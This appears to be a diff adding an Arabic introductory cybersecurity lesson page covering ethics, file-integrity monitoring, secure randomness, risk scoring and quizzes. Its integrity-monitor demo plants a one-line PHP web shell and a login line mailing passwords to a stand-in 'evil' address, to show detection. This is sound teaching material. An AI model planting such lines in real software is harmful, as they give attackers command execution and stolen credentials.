+                    <tr><td>محلل البرمجيات الخبيثة</td><td>يفكك البرمجيات الخبيثة ليفهم سلوكها ويكتب طرق كشفها</td></tr>
+                </tbody>
+            </table>
+        </div>
+</section>
+
+<section class="section-card" id="ethics">
+    <h2 class="section-title">
+        <span class="num">2</span>
+        <i class="fas fa-balance-scale"></i>
+        الأخلاقيات والقانون: القاعدة الأولى
+    </h2>
+        <div class="alert alert-warn">
+            <i class="fas fa-exclamation-triangle"></i>
+            <div>
+                <strong>القاعدة التي لا استثناء لها: لا تختبر أي نظام لا تملكه أو لا تملك تصريحًا مكتوبًا باختباره.</strong>
+                فحص منافذ خادم شركة، أو تجربة كلمات مرور على حساب غيرك، أو تجربة «حقن» على موقع حقيقي — كلها جرائم يعاقب عليها القانون
+                (مثل <strong>نظام مكافحة الجرائم المعلوماتية</strong> في السعودية وما يماثله في كل الدول)، حتى لو كانت نيتك «التعلم» أو «المساعدة».
+            </div>
+        </div>
+        <ul>
+            <li><strong>التصريح المكتوب:</strong> في العمل المهني يوقَّع اتفاق يحدد ما المسموح اختباره، ومتى، وبأي أدوات، ومن تتواصل معه عند المشكلة.</li>
+            <li><strong>النطاق (Scope):</strong> التصريح باختبار <code>shop.example.com</code> لا يشمل <code>mail.example.com</code>. ما خارج النطاق ممنوع.</li>
+            <li><strong>الإفصاح المسؤول:</strong> إذا اكتشفت ثغرة صدفة، أبلغ أصحاب النظام بسرية وأمهلهم لإصلاحها، ولا تستغلها ولا تنشرها. كثير من الشركات لديها برامج «مكافآت الثغرات» رسمية.</li>
+            <li><strong>البيانات:</strong> إذا اطلعت على بيانات أثناء اختبار مصرّح، لا تنسخها ولا تحتفظ بها أكثر من اللازم لإثبات الثغرة.</li>
+        </ul>
+        <p>
+            <strong>أين تتدرب إذن؟</strong> كل أمثلة هذا التخصص تعمل على <strong>جهازك</strong> وعلى خوادم تجريبية تشغّلها بنفسك. وللتدرب أكثر هناك بيئات صُممت
+            لتُخترق بشكل قانوني:
+        </p>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>البيئة</th><th>ما هي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>OWASP Juice Shop / DVWA</td><td>تطبيقات ويب مليئة بالثغرات عمدًا، تشغّلها على جهازك</td></tr>
+                    <tr><td>PortSwigger Web Security Academy</td><td>دروس ومختبرات مجانية لثغرات الويب</td></tr>
+                    <tr><td>TryHackMe و Hack The Box</td><td>أجهزة افتراضية وتحديات بتصريح كامل</td></tr>
+                    <tr><td>OverTheWire</td><td>ألعاب تعلّم Linux والأمن خطوة بخطوة</td></tr>
+                    <tr><td>مسابقات CTF</td><td>منافسات «التقاط العلم» القانونية للطلاب والمحترفين</td></tr>
+                </tbody>
+            </table>
+        </div>
+</section>
+
+<section class="section-card" id="python">
+    <h2 class="section-title">
+        <span class="num">3</span>
+        <i class="fas fa-python"></i>
+        لماذا Python؟
+    </h2>
+        <p>
+            المحلل الأمني يحتاج كل يوم أداة صغيرة لمهمة محددة: تحليل سجل، أو فحص ملفات، أو اختبار إعداد. بايثون مثالية لأنها سريعة الكتابة، وتأتي بمكتبة قياسية غنية،
+            وأغلب أدوات الأمن الشهيرة إما مكتوبة بها أو تقبل إضافات بها.
+        </p>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>المكتبة</th><th>الاستخدام الأمني</th><th>الدرس</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><code>hashlib</code> و <code>hmac</code></td><td>بصمات الملفات والتحقق من السلامة والتوقيعات</td><td>1، 2</td></tr>
+                    <tr><td><code>secrets</code></td><td>توليد رموز وكلمات مرور عشوائية آمنة</td><td>1، 8</td></tr>
+                    <tr><td><code>cryptography</code></td><td>التشفير المتماثل وغير المتماثل</td><td>2</td></tr>
+                    <tr><td><code>socket</code> و <code>ipaddress</code> و <code>ssl</code></td><td>الاتصالات الشبكية والعناوين والشهادات</td><td>3، 4</td></tr>
+                    <tr><td><code>re</code> و <code>collections</code></td><td>تحليل السجلات واكتشاف الأنماط</td><td>5</td></tr>
+                    <tr><td><code>struct</code></td><td>قراءة الحزم الشبكية بايتًا بايتًا</td><td>6</td></tr>
+                    <tr><td><code>sqlite3</code> و Flask</td><td>تجربة ثغرات الويب وإصلاحها محليًا</td><td>7</td></tr>
+                </tbody>
+            </table>
+        </div>
+        <div class="alert alert-info">
+            <i class="fas fa-info-circle"></i>
+            <div>
+                أنشئ مجلدًا مستقلًا لمختبرك وبيئة افتراضية خاصة به: <code>python -m venv .venv</code> ثم <code>pip install cryptography requests flask</code>.
+                ولا تشغّل سكربتات أمنية تنزّلها من الإنترنت قبل قراءتها كاملة — بعض «أدوات الاختراق» المنتشرة هي نفسها برمجيات خبيثة.
+            </div>
+        </div>
+</section>
+
+<section class="section-card" id="integrity">
+    <h2 class="section-title">
+        <span class="num">4</span>
+        <i class="fas fa-fingerprint"></i>
+        أول أداة دفاعية: مراقب سلامة الملفات
+    </h2>
+        <p>
+            عندما يخترق مهاجم موقعًا، غالبًا يعدّل ملفًا (يزرع «باب خلفي») أو يضيف ملفًا جديدًا. كيف تكتشف ذلك؟ احسب <strong>بصمة SHA-256</strong> لكل ملف
+            وأنت متأكد أن الموقع سليم (خط الأساس)، ثم قارن البصمات لاحقًا: أي تغيير ولو حرف واحد يغيّر البصمة كليًا. هذه فكرة أدوات حقيقية مثل Tripwire و AIDE.
+        </p>
+<div class="code-block">
+    <div class="code-header">
+        <span class="lang"><i class="fab fa-python"></i> Python</span>
+        <span>integrity_monitor.py</span>
+    </div>
+<pre><span class="kw">import</span> hashlib
+<span class="kw">import</span> json
+<span class="kw">from</span> pathlib <span class="kw">import</span> Path
+
+
+<span class="kw">def</span> <span class="fn">fingerprint</span>(path):
+    h = hashlib.<span class="fn">sha256</span>()
+    <span class="kw">with</span> <span class="fn">open</span>(path, <span class="str">"rb"</span>) <span class="kw">as</span> f:
+        <span class="kw">for</span> chunk <span class="kw">in</span> <span class="fn">iter</span>(<span class="kw">lambda</span>: f.<span class="fn">read</span>(<span class="num">65536</span>), <span class="str">b""</span>):     <span class="cm"># على أجزاء: يعمل مع الملفات الضخمة</span>
+            h.<span class="fn">update</span>(chunk)
+    <span class="kw">return</span> h.<span class="fn">hexdigest</span>()
+
+
+<span class="kw">def</span> <span class="fn">snapshot</span>(folder):
+    folder = <span class="fn">Path</span>(folder)
+    <span class="kw">return</span> {p.<span class="fn">relative_to</span>(folder).<span class="fn">as_posix</span>(): <span class="fn">fingerprint</span>(p) <span class="kw">for</span> p <span class="kw">in</span> <span class="fn">sorted</span>(folder.<span class="fn">rglob</span>(<span class="str">"*"</span>)) <span class="kw">if</span> p.<span class="fn">is_file</span>()}
+
+
+<span class="kw">def</span> <span class="fn">compare</span>(baseline, current):
+    added = <span class="fn">sorted</span>(current.<span class="fn">keys</span>() - baseline.<span class="fn">keys</span>())
+    removed = <span class="fn">sorted</span>(baseline.<span class="fn">keys</span>() - current.<span class="fn">keys</span>())
+    modified = <span class="fn">sorted</span>(f <span class="kw">for</span> f <span class="kw">in</span> baseline.<span class="fn">keys</span>() &amp; current.<span class="fn">keys</span>() <span class="kw">if</span> baseline[f] != current[f])
+    <span class="kw">return</span> added, removed, modified
+
+
+<span class="cm"># 1) خط الأساس: الموقع سليم الآن</span>
+baseline = <span class="fn">snapshot</span>(<span class="str">"website"</span>)
+<span class="fn">Path</span>(<span class="str">"baseline.json"</span>).<span class="fn">write_text</span>(json.<span class="fn">dumps</span>(baseline, indent=<span class="num">2</span>), encoding=<span class="str">"utf-8"</span>)
+<span class="fn">print</span>(<span class="str">f"خط الأساس: {len(baseline)} ملفات | مثال: index.html → {baseline['index.html'][:16]}..."</span>)
+
+<span class="cm"># 2) مهاجم يعدّل ملف الدخول ويضيف ملفًا خبيثًا</span>
+<span class="fn">Path</span>(<span class="str">"website/login.php"</span>).<span class="fn">write_text</span>(<span class="str">"&lt;?php check_password($user, $pass); mail('x@evil', $pass); ?&gt;"</span>, encoding=<span class="str">"utf-8"</span>)
+<span class="fn">Path</span>(<span class="str">"website/admin/shell.php"</span>).<span class="fn">write_text</span>(<span class="str">"&lt;?php system($_GET['c']); ?&gt;"</span>, encoding=<span class="str">"utf-8"</span>)
+
+<span class="cm"># 3) الفحص الدوري</span>
+added, removed, modified = <span class="fn">compare</span>(json.<span class="fn">loads</span>(<span class="fn">Path</span>(<span class="str">"baseline.json"</span>).<span class="fn">read_text</span>(encoding=<span class="str">"utf-8"</span>)), <span class="fn">snapshot</span>(<span class="str">"website"</span>))
+<span class="kw">for</span> name <span class="kw">in</span> added:
+    <span class="fn">print</span>(<span class="str">"🆕 ملف جديد:"</span>, name)
+<span class="kw">for</span> name <span class="kw">in</span> modified:
+    <span class="fn">print</span>(<span class="str">"✏️ ملف معدّل:"</span>, name)
+<span class="kw">for</span> name <span class="kw">in</span> removed:
+    <span class="fn">print</span>(<span class="str">"🗑️ ملف محذوف:"</span>, name)
+<span class="fn">print</span>(<span class="str">"الحالة:"</span>, <span class="str">"🚨 تغييرات تحتاج تحقيقًا"</span> <span class="kw">if</span> added <span class="kw">or</span> modified <span class="kw">or</span> removed <span class="kw">else</span> <span class="str">"✅ سليم"</span>)</pre>
+</div>
+<div class="output-block">
+    <div class="output-header"><i class="fas fa-terminal"></i> المخرجات</div>
+    <pre>خط الأساس: 3 ملفات | مثال: index.html → 3a49b9fc8f55fdb0...
+🆕 ملف جديد: admin/shell.php
+✏️ ملف معدّل: login.php
+الحالة: 🚨 تغييرات تحتاج تحقيقًا</pre>
+</div>
+        <div class="alert alert-tip">
+            <i class="fas fa-lightbulb"></i>
+            <div>
+                <strong>احمِ خط الأساس نفسه:</strong> إذا حفظت <code>baseline.json</code> على الخادم نفسه، يستطيع المهاجم تحديثه ليخفي آثاره.
+                احفظه على جهاز آخر أو في مكان للقراءة فقط، أو وقّعه بمفتاح سري (HMAC — الدرس القادم). وجدوِل الفحص كل ساعة وأرسل النتيجة بالتنبيهات
+                (كما تعلمت في تخصص الأتمتة).
+            </div>
+        </div>
+</section>
+
+<section class="section-card" id="random">
+    <h2 class="section-title">
+        <span class="num">5</span>
+        <i class="fas fa-dice"></i>
+        random ليست للأسرار: استخدم secrets
+    </h2>
+        <p>
+            مطوّر يولّد رموز «استعادة كلمة المرور» بـ <code>random</code>. المشكلة أن <code>random</code> <strong>مولّد متوقَّع</strong>: صُمم للمحاكاة والألعاب،
+            وإذا عرف أحد حالته الداخلية (البذرة) يستطيع حساب كل الرموز التالية. لنرَ ذلك بمثال مبسّط يستخدم البذرة نفسها:
+        </p>
+<div class="code-block">
+    <div class="code-header">
+        <span class="lang"><i class="fab fa-python"></i> Python</span>
+        <span>random_vs_secrets.py</span>
+    </div>
+<pre><span class="kw">import</span> random
+<span class="kw">import</span> secrets
+<span class="kw">import</span> string
+
+ALPHABET = string.ascii_letters + string.digits
+
+<span class="cm"># الخادم يولّد رموز الاستعادة بـ random (بذرة من وقت التشغيل مثلًا)</span>
+server = random.<span class="fn">Random</span>(<span class="num">1741942800</span>)
+issued = [<span class="str">""</span>.<span class="fn">join</span>(server.<span class="fn">choice</span>(ALPHABET) <span class="kw">for</span> _ <span class="kw">in</span> <span class="fn">range</span>(<span class="num">8</span>)) <span class="kw">for</span> _ <span class="kw">in</span> <span class="fn">range</span>(<span class="num">3</span>)]
+<span class="fn">print</span>(<span class="str">"رموز الخادم:  "</span>, issued)
+
+<span class="cm"># المهاجم خمّن وقت تشغيل الخادم (البذرة) فأعاد إنتاج الرموز نفسها!</span>
+attacker = random.<span class="fn">Random</span>(<span class="num">1741942800</span>)
+guessed = [<span class="str">""</span>.<span class="fn">join</span>(attacker.<span class="fn">choice</span>(ALPHABET) <span class="kw">for</span> _ <span class="kw">in</span> <span class="fn">range</span>(<span class="num">8</span>)) <span class="kw">for</span> _ <span class="kw">in</span> <span class="fn">range</span>(<span class="num">3</span>)]
+<span class="fn">print</span>(<span class="str">"تخمين المهاجم:"</span>, guessed)
+<span class="fn">print</span>(<span class="str">"متطابقة؟"</span>, issued == guessed)
+
+<span class="cm"># الحل: secrets تستخدم مصدر العشوائية الآمن في نظام التشغيل</span>
+token = secrets.<span class="fn">token_urlsafe</span>(<span class="num">32</span>)
+<span class="fn">print</span>(<span class="str">"\nرمز آمن طوله:"</span>, <span class="fn">len</span>(token), <span class="str">"حرفًا | عشوائيته:"</span>, <span class="num">32</span> * <span class="num">8</span>, <span class="str">"بت"</span>)
+<span class="fn">print</span>(<span class="str">"رقم تحقق من 6 خانات:"</span>, <span class="str">f"{secrets.randbelow(10**6):06d}"</span>.<span class="fn">isdigit</span>())
+<span class="fn">print</span>(<span class="str">"مقارنة آمنة:"</span>, secrets.<span class="fn">compare_digest</span>(<span class="str">"abc123"</span>, <span class="str">"abc123"</span>))</pre>
+</div>
+<div class="output-block">
+    <div class="output-header"><i class="fas fa-terminal"></i> المخرجات</div>
+    <pre>رموز الخادم:   ['tovJVnv6', '7HimGQu3', 'yIJJ7Ppg']
+تخمين المهاجم: ['tovJVnv6', '7HimGQu3', 'yIJJ7Ppg']
+متطابقة؟ True
+
+رمز آمن طوله: 43 حرفًا | عشوائيته: 256 بت
+رقم تحقق من 6 خانات: True
+مقارنة آمنة: True</pre>
+</div>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>المهمة</th><th>استخدم</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>رمز استعادة كلمة المرور أو رمز جلسة</td><td><code>secrets.token_urlsafe(32)</code></td></tr>
+                    <tr><td>مفتاح API</td><td><code>secrets.token_hex(32)</code></td></tr>
+                    <tr><td>رمز تحقق من 6 أرقام</td><td><code>f"{secrets.randbelow(10**6):06d}"</code></td></tr>
+                    <tr><td>مقارنة رمز أدخله المستخدم بالمحفوظ</td><td><code>secrets.compare_digest(a, b)</code> لا <code>a == b</code></td></tr>
+                    <tr><td>محاكاة، ألعاب، خلط بيانات للتجربة</td><td><code>random</code> (مناسبة هنا تمامًا)</td></tr>
+                </tbody>
+            </table>
+        </div>
+        <p>
+            لماذا <code>compare_digest</code>؟ المقارنة العادية <code>==</code> تتوقف عند أول حرف مختلف، فتستغرق وقتًا أطول قليلًا كلما كان التخمين أقرب للصحيح.
+            بقياس هذا الفرق ملايين المرات يمكن نظريًا تخمين الرمز حرفًا حرفًا (هجوم التوقيت). <code>compare_digest</code> تستغرق الوقت نفسه دائمًا.
+        </p>
+</section>
+
+<section class="section-card" id="risk">
+    <h2 class="section-title">
+        <span class="num">6</span>
+        <i class="fas fa-th"></i>
+        تقييم المخاطر: بماذا نبدأ؟
+    </h2>
+        <p>
+            لا يمكنك إصلاح كل شيء دفعة واحدة. المحترفون يرتبون الأولويات بـ<strong>مصفوفة المخاطر</strong>:
+            <strong>الخطر = الاحتمالية × الأثر</strong>، كل منهما من 1 إلى 5. لنقيّم نتائج فحص أمني لمتجر صغير:
+        </p>
+<div class="code-block">
+    <div class="code-header">
+        <span class="lang"><i class="fab fa-python"></i> Python</span>
+        <span>risk_matrix.py</span>
+    </div>
+<pre>FINDINGS = [
+    <span class="cm"># (الملاحظة، الاحتمالية 1-5، الأثر 1-5)</span>
+    (<span class="str">"صفحة الدخول بلا حد لعدد المحاولات"</span>, <span class="num">4</span>, <span class="num">4</span>),
+    (<span class="str">"كلمات المرور مخزنة بـ MD5 بلا ملح"</span>, <span class="num">3</span>, <span class="num">5</span>),
+    (<span class="str">"نسخة قديمة من مكتبة فيها ثغرة معروفة"</span>, <span class="num">3</span>, <span class="num">4</span>),
+    (<span class="str">"رسائل الخطأ تعرض مسارات الخادم"</span>, <span class="num">3</span>, <span class="num">2</span>),
+    (<span class="str">"لا توجد نسخ احتياطية خارج الخادم"</span>, <span class="num">2</span>, <span class="num">5</span>),
+    (<span class="str">"خط غير مشفر في صفحة «من نحن»"</span>, <span class="num">1</span>, <span class="num">1</span>),
+]
+
+
+<span class="kw">def</span> <span class="fn">level</span>(score):
+    <span class="kw">if</span> score &gt;= <span class="num">15</span>:
+        <span class="kw">return</span> <span class="str">"🔴 حرج"</span>
+    <span class="kw">if</span> score &gt;= <span class="num">8</span>:
+        <span class="kw">return</span> <span class="str">"🟠 مرتفع"</span>
+    <span class="kw">if</span> score &gt;= <span class="num">4</span>:
+        <span class="kw">return</span> <span class="str">"🟡 متوسط"</span>
+    <span class="kw">return</span> <span class="str">"🟢 منخفض"</span>
+
+
+ranked = <span class="fn">sorted</span>(FINDINGS, key=<span class="kw">lambda</span> f: f[<span class="num">1</span>] * f[<span class="num">2</span>], reverse=<span class="kw">True</span>)
+<span class="kw">for</span> title, likelihood, impact <span class="kw">in</span> ranked:
+    score = likelihood * impact
+    <span class="fn">print</span>(<span class="str">f"{score:&gt;2}  {level(score):&lt;10} {title}"</span>)
+<span class="fn">print</span>(<span class="str">"\nابدأ بـ:"</span>, ranked[<span class="num">0</span>][<span class="num">0</span>])</pre>
+</div>
+<div class="output-block">
+    <div class="output-header"><i class="fas fa-terminal"></i> المخرجات</div>
+    <pre>16  🔴 حرج      صفحة الدخول بلا حد لعدد المحاولات
+15  🔴 حرج      كلمات المرور مخزنة بـ MD5 بلا ملح
+12  🟠 مرتفع    نسخة قديمة من مكتبة فيها ثغرة معروفة
+10  🟠 مرتفع    لا توجد نسخ احتياطية خارج الخادم
+ 6  🟡 متوسط    رسائل الخطأ تعرض مسارات الخادم
+ 1  🟢 منخفض    خط غير مشفر في صفحة «من نحن»
+
+ابدأ بـ: صفحة الدخول بلا حد لعدد المحاولات</pre>
+</div>
+        <p>
+            لاحظ أن «النسخ الاحتياطية» احتماليتها منخفضة لكن أثرها كارثي (برنامج فدية يمسح كل شيء)، فجاءت أعلى من رسائل الخطأ الأكثر احتمالًا.
+            جرّب المصفوفة بنفسك في المختبر أسفل الصفحة.
+        </p>
+</section>
+
+<section class="section-card" id="mindset">
+    <h2 class="section-title">
+        <span class="num">7</span>
+        <i class="fas fa-brain"></i>
+        عقلية المدافع: مبادئ ستراها في كل درس
+    </h2>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>المبدأ</th><th>المعنى</th><th>مثال</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>الدفاع في العمق</td><td>طبقات حماية متعددة؛ سقوط واحدة لا يعني سقوط النظام</td><td>كلمة مرور قوية + 2FA + حد للمحاولات + مراقبة</td></tr>
+                    <tr><td>أقل صلاحية ممكنة</td><td>كل مستخدم وبرنامج يملك فقط ما يحتاجه</td><td>تطبيق الويب يتصل بقاعدة البيانات بحساب لا يستطيع حذف الجداول</td></tr>
+                    <tr><td>لا تثق بالمدخلات</td><td>كل ما يأتي من الخارج قد يكون خبيثًا</td><td>استعلامات SQL بالمعاملات (الدرس 7)</td></tr>
+                    <tr><td>الفشل الآمن</td><td>عند الخطأ يُرفض الوصول، لا يُسمح به</td><td>تعذّر التحقق من الصلاحية ← رفض الطلب</td></tr>
+                    <tr><td>سجّل وراقب</td><td>لا تستطيع اكتشاف ما لا تراه</td><td>تسجيل محاولات الدخول الفاشلة (الدرس 5)</td></tr>
+                    <tr><td>لا أمن بالإخفاء وحده</td><td>إخفاء الصفحة ليس حماية لها</td><td>رابط <code>/admin-x7</code> بلا كلمة مرور سيُكتشف</td></tr>
+                </tbody>
+            </table>
+        </div>
+</section>
+
+<section class="section-card" id="exercises">
+    <h2 class="section-title">
+        <span class="num">8</span>
+        <i class="fas fa-pencil-alt"></i>
+        التمارين التفاعلية
+    </h2>
+    <p>اختبر فهمك للدرس من خلال 5 تمارين متنوعة، ثم جرّب المختبر التفاعلي في الأسفل:</p>
+<div class="exercise-block" id="q1" data-ok="صحيح! تعديل المعلومة دون إذن هو كسر للسلامة، وبصمات الملفات تكشفه." data-hint="المعلومة لم تُسرّب ولم يتوقف النظام، لكنها تغيّرت.">
+    <div class="exercise-head">
+        <span class="exercise-num">1</span>
+        <h4>اختيار من متعدد</h4>
+        <span class="exercise-tag">ثالوث CIA</span>
+    </div>
+    <p class="exercise-question">مهاجم غيّر رقم الحساب البنكي في فاتورة PDF قبل أن تصل للعميل، دون أن يطّلع على شيء آخر. أي خاصية انكسرت؟</p>
+    <div class="options-list">
+        <label class="option" data-correct="0"><input type="radio" name="q1" value="1"> السرية (Confidentiality)</label>
+        <label class="option" data-correct="1"><input type="radio" name="q1" value="2"> السلامة (Integrity)</label>
+        <label class="option" data-correct="0"><input type="radio" name="q1" value="3"> التوافر (Availability)</label>
+        <label class="option" data-correct="0"><input type="radio" name="q1" value="4"> لم تنكسر أي خاصية</label>
+    </div>
+    <div class="exercise-actions">
+        <button class="btn btn-primary" onclick="checkMC('q1')"><i class="fas fa-check"></i> تحقق</button>
+        <button class="btn btn-secondary" onclick="resetMC('q1')"><i class="fas fa-redo"></i> إعادة</button>
+    </div>
+    <div class="result-msg" id="q1-result"></div>
+</div>
+<div class="exercise-block" id="q2" data-ok="ممتاز! تفكر كمدافع مسؤول." data-hint="التصريح المكتوب شرط، والإخفاء ليس حماية.">
+    <div class="exercise-head">
+        <span class="exercise-num">2</span>
+        <h4>صح أم خطأ</h4>
+        <span class="exercise-tag">اختر لكل عبارة</span>
+    </div>
+    <p class="exercise-question">اقرأ كل عبارة وحدد إن كانت <strong>صحيحة</strong> أم <strong>خاطئة</strong>:</p>
+    <div class="tf-list">
+        <div class="tf-item" data-answer="false">
+            <span class="tf-statement">يجوز فحص منافذ خادم شركة إذا كانت نيتك إبلاغهم بالثغرات.</span>
+            <div class="tf-actions">
+                <button class="tf-btn" onclick="pickTF(this, true)">صح</button>
+                <button class="tf-btn" onclick="pickTF(this, false)">خطأ</button>
+            </div>
+        </div>
+        <div class="tf-item" data-answer="false">
+            <span class="tf-statement"><code>random</code> مناسبة لتوليد رموز استعادة كلمة المرور.</span>
+            <div class="tf-actions">
+                <button class="tf-btn" onclick="pickTF(this, true)">صح</button>
+                <button class="tf-btn" onclick="pickTF(this, false)">خطأ</button>
+            </div>
+        </div>
+        <div class="tf-item" data-answer="true">
+            <span class="tf-statement">تغيير حرف واحد في الملف يغيّر بصمة SHA-256 بالكامل.</span>
+            <div class="tf-actions">
+                <button class="tf-btn" onclick="pickTF(this, true)">صح</button>
+                <button class="tf-btn" onclick="pickTF(this, false)">خطأ</button>
+            </div>
+        </div>
+        <div class="tf-item" data-answer="true">
+            <span class="tf-statement">الخطر في مصفوفة المخاطر = الاحتمالية × الأثر.</span>
+            <div class="tf-actions">
+                <button class="tf-btn" onclick="pickTF(this, true)">صح</button>
+                <button class="tf-btn" onclick="pickTF(this, false)">خطأ</button>
+            </div>
+        </div>
+        <div class="tf-item" data-answer="false">
+            <span class="tf-statement">إخفاء رابط لوحة التحكم يكفي لحمايتها.</span>
+            <div class="tf-actions">
+                <button class="tf-btn" onclick="pickTF(this, true)">صح</button>
+                <button class="tf-btn" onclick="pickTF(this, false)">خطأ</button>
+            </div>
+        </div>
+    </div>
+    <div class="exercise-actions">
+        <button class="btn btn-primary" onclick="checkTF('q2')"><i class="fas fa-check"></i> تحقق</button>
+        <button class="btn btn-secondary" onclick="resetTF('q2')"><i class="fas fa-redo"></i> إعادة</button>
+    </div>
+    <div class="result-msg" id="q2-result"></div>
+</div>
+<div class="exercise-block" id="q3" data-ok="صحيح! SHA-256 = 256 بت = 64 خانة ست عشرية، والمدخل نفسه يعطي البصمة نفسها دائمًا." data-hint="كل خانة ست عشرية تمثل 4 بت.">
+    <div class="exercise-head">
+        <span class="exercise-num">3</span>
+        <h4>توقّع الناتج</h4>
+        <span class="exercise-tag">hashlib</span>
+    </div>
+    <p class="exercise-question">ما الذي سيطبعه الكود؟</p>
+<div class="code-block">
+    <div class="code-header">
+        <span class="lang"><i class="fab fa-python"></i> Python</span>
+        <span>predict.py</span>
+    </div>
+<pre><span class="kw">import</span> hashlib
+a = hashlib.<span class="fn">sha256</span>(<span class="str">b"hello"</span>).<span class="fn">hexdigest</span>()
+b = hashlib.<span class="fn">sha256</span>(<span class="str">b"hello"</span>).<span class="fn">hexdigest</span>()
+c = hashlib.<span class="fn">sha256</span>(<span class="str">b"Hello"</span>).<span class="fn">hexdigest</span>()
+<span class="fn">print</span>(<span class="fn">len</span>(a))
+<span class="fn">print</span>(a == b)
+<span class="fn">print</span>(a == c)
+<span class="fn">print</span>(<span class="fn">len</span>(hashlib.<span class="fn">md5</span>(<span class="str">b"hello"</span>).<span class="fn">hexdigest</span>()))</pre>
+</div>
+    <div class="code-fill">
+        <div class="line"><span class="cm">السطر 1:</span><input type="text" class="blank-input" data-answers="64" placeholder="..." style="min-width:80px;" autocomplete="off" spellcheck="false"></div>
+        <div class="line"><span class="cm">السطر 2:</span><input type="text" class="blank-input" data-answers="True" placeholder="..." style="min-width:86px;" autocomplete="off" spellcheck="false"></div>
+        <div class="line"><span class="cm">السطر 3:</span><input type="text" class="blank-input" data-answers="False" placeholder="..." style="min-width:100px;" autocomplete="off" spellcheck="false"></div>
+        <div class="line"><span class="cm">السطر 4:</span><input type="text" class="blank-input" data-answers="32" placeholder="..." style="min-width:80px;" autocomplete="off" spellcheck="false"></div>
+    </div>
+    <div class="exercise-actions">
+        <button class="btn btn-primary" onclick="checkFill('q3')"><i class="fas fa-check"></i> تحقق</button>
+        <button class="btn btn-secondary" onclick="resetFill('q3')"><i class="fas fa-redo"></i> إعادة</button>
+    </div>
+    <div class="result-msg" id="q3-result"></div>
+</div>
+<div class="exercise-block" id="q4" data-ok="أحسنت! توليد آمن ومقارنة ثابتة الزمن." data-hint="الرمز الصالح للروابط هو &lt;code&gt;token_urlsafe&lt;/code&gt;.">
+    <div class="exercise-head">
+        <span class="exercise-num">4</span>
+        <h4>أكمل الكود</h4>
+        <span class="exercise-tag">secrets</span>
+    </div>
+    <p class="exercise-question">أكمل الكود لتوليد رمز جلسة آمن والتحقق من رمز أرسله المستخدم:</p>
+    <div class="code-fill">
+        <div class="line"><span><span class="kw">import</span> </span><input type="text" class="blank-input" data-answers="secrets" placeholder="..." style="min-width:128px;" autocomplete="off" spellcheck="false"></div>
+        <div class="line"><span>token = secrets.</span><input type="text" class="blank-input" data-answers="token_urlsafe" placeholder="..." style="min-width:212px;" autocomplete="off" spellcheck="false"><span>(<span class="num">32</span>)</span></div>
+        <div class="line"><span>ok = secrets.</span><input type="text" class="blank-input" data-answers="compare_digest" placeholder="..." style="min-width:226px;" autocomplete="off" spellcheck="false"><span>(user_token, token)</span></div>
+    </div>
+    <div class="exercise-actions">
+        <button class="btn btn-primary" onclick="checkFill('q4')"><i class="fas fa-check"></i> تحقق</button>
+        <button class="btn btn-secondary" onclick="resetFill('q4')"><i class="fas fa-redo"></i> إعادة</button>
+    </div>
+    <div class="result-msg" id="q4-result"></div>
+</div>
+<div class="exercise-block" id="q5" data-ok="ترتيب ممتاز! التصريح أولًا دائمًا، والهدف النهائي هو الإصلاح." data-hint="لا شيء يبدأ قبل التصريح.">
+    <div class="exercise-head">
+        <span class="exercise-num">5</span>
+        <h4>رتّب الكود</h4>
+        <span class="exercise-tag">استخدم الأسهم</span>
+    </div>
+    <p class="exercise-question">رتّب مراحل اختبار أمني احترافي. <em>(من الأعلى إلى الأسفل)</em></p>
+    <div class="sortable-list">
+        <div class="sortable-item" data-correct="4" data-orig="1">
+            <span class="order-num">1</span>
+            <span style="flex:1; white-space:pre;">4) توثيق النتائج وتقييم مخاطرها</span>
+            <div class="sort-arrows">
+                <button class="sort-btn" onclick="moveItem(this, -1)"><i class="fas fa-arrow-up"></i></button>
+                <button class="sort-btn" onclick="moveItem(this, 1)"><i class="fas fa-arrow-down"></i></button>
+            </div>
+        </div>
+        <div class="sortable-item" data-correct="1" data-orig="2">
+            <span class="order-num">2</span>
+            <span style="flex:1; white-space:pre;">1) الحصول على تصريح مكتوب</span>
+            <div class="sort-arrows">
+                <button class="sort-btn" onclick="moveItem(this, -1)"><i class="fas fa-arrow-up"></i></button>
+                <button class="sort-btn" onclick="moveItem(this, 1)"><i class="fas fa-arrow-down"></i></button>
+            </div>
+        </div>
+        <div class="sortable-item" data-correct="5" data-orig="3">
+            <span class="order-num">3</span>
+            <span style="flex:1; white-space:pre;">5) تسليم التقرير ومساعدة الفريق في الإصلاح</span>
+            <div class="sort-arrows">
+                <button class="sort-btn" onclick="moveItem(this, -1)"><i class="fas fa-arrow-up"></i></button>
+                <button class="sort-btn" onclick="moveItem(this, 1)"><i class="fas fa-arrow-down"></i></button>
+            </div>
+        </div>
+        <div class="sortable-item" data-correct="3" data-orig="4">
+            <span class="order-num">4</span>
+            <span style="flex:1; white-space:pre;">3) تنفيذ الاختبار داخل النطاق فقط</span>
+            <div class="sort-arrows">
+                <button class="sort-btn" onclick="moveItem(this, -1)"><i class="fas fa-arrow-up"></i></button>
+                <button class="sort-btn" onclick="moveItem(this, 1)"><i class="fas fa-arrow-down"></i></button>
+            </div>
+        </div>
+        <div class="sortable-item" data-correct="2" data-orig="5">
+            <span class="order-num">5</span>
+            <span style="flex:1; white-space:pre;">2) تحديد النطاق والقواعد</span>
+            <div class="sort-arrows">
+                <button class="sort-btn" onclick="moveItem(this, -1)"><i class="fas fa-arrow-up"></i></button>
+                <button class="sort-btn" onclick="moveItem(this, 1)"><i class="fas fa-arrow-down"></i></button>
+            </div>
+        </div>
+    </div>
+    <div class="exercise-actions">
+        <button class="btn btn-primary" onclick="checkSort('q5')"><i class="fas fa-check"></i> تحقق</button>
+        <button class="btn btn-secondary" onclick="resetSort('q5')"><i class="fas fa-redo"></i> إعادة</button>
+    </div>
+    <div class="result-msg" id="q5-result"></div>
+</div>
+<div class="lab">
+    <div class="lab-head"><i class="fas fa-flask"></i> مختبر مصفوفة المخاطر</div>
